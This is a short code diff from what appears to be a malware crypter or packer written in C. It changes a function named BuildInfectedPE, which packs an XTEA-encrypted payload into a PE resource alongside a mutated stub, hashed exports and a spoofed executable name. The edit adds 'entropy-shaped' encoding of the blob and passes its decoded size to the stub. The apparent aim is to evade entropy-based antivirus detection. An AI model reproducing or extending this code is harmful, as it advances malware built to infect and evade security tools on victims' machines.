@@ -56,6 +56,7 @@ BOOL WriteBufferToFile(const char* filePath, const BYTE* inBuffer, DWORD inSize)
 BOOL BuildInfectedPE(const char* stubPath, const char* outputPath,
                      const BYTE* payloadBuffer, SIZE_T payloadSize,
                      ULONG originalDecompressedSize, DWORD mutatedStubSize,
+                     DWORD decodedBlobSize,
                      const DWORD key_salt[4], const BYTE dll_indices[3],
                      DWORD exportHash, const char* pExportArg,
                      const char* pSpoofExe,
@@ -143,7 +144,7 @@ BOOL BuildInfectedPE(const char* stubPath, const char* outputPath,
     }
     HeapFree(GetProcessHeap(), 0, pStubBuf);
 
-    // Resource layout: [XTEA blob][PAYLOAD_METADATA]
+    // Resource layout: [entropy-shaped XTEA blob (2x decoded size)][PAYLOAD_METADATA]
     // sizeof(PAYLOAD_METADATA) = 280, verified at compile time in PeBuilder.h.
     DWORD dwPayloadSize     = (DWORD)payloadSize;
     DWORD totalResourceSize = dwPayloadSize + (DWORD)sizeof(PAYLOAD_METADATA);
@@ -154,7 +155,7 @@ BOOL BuildInfectedPE(const char* stubPath, const char* outputPath,
         return FALSE;
     }
 
-    // A. XTEA-encrypted blob at offset 0.
+    // A. Entropy-shaped (encoded) XTEA blob at offset 0.
     memcpy(resPayload, payloadBuffer, payloadSize);
 
     // B. Fill metadata struct immediately after the blob.
@@ -171,7 +172,7 @@ BOOL BuildInfectedPE(const char* stubPath, const char* outputPath,
 
     pMeta->origSize   = (DWORD)originalDecompressedSize;
     pMeta->stubSize   = mutatedStubSize;
-    pMeta->blobSize   = dwPayloadSize;
+    pMeta->blobSize   = decodedBlobSize;  /* DECODED size — Stub derives encoded = blobSize*2 */
     pMeta->exportHash = exportHash;
 
     if (pExportArg && *pExportArg) {
